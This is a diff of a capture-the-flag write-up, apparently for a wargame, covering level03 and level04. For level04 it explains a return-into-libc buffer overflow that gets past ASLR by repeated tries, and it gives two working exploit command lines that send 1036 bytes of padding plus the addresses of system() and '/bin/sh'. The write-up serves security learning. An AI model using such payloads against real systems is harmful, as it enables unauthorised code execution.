@@ -52,11 +52,11 @@ level03 doesn't do negative bounds checking on the user input. also, the address
 
 level04 is vulnerable to a buffer overflow but it is a bit tricky to exploit because of ASLR. After looking at the entropy of the address (<= 12 bits) for the 'system' method I decided to do a return into libc attack. I found the address of the 'system' method using gdb and the address of a '/bin/sh' string using gdb then overwrote the saved EIP to the address of the system method and added the address of '/bin/sh' as an argument. I tested using gdb without address randomization first then turned on address randomization to find an address and then repeated the same address many times until I was lucky enough to succeed.
 
-# working without address randomisation
+- working without address randomisation
 
     gdb --args ./level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xe3\xea\xf7\xde\xad\xbe\xef\xee\x6b\xfa\xf7"'`
 
-# working with address randomisation. needs to be repeatedly run to succeed.
+- working with address randomisation. needs to be repeatedly run to succeed.
 
     /levels/level04 `perl -e 'print "A" x 1036'``perl -e 'print "\xd0\xc3\x66\xf7\xde\xad\xbe\xef\xee\x4b\x76\xf7"'`
 
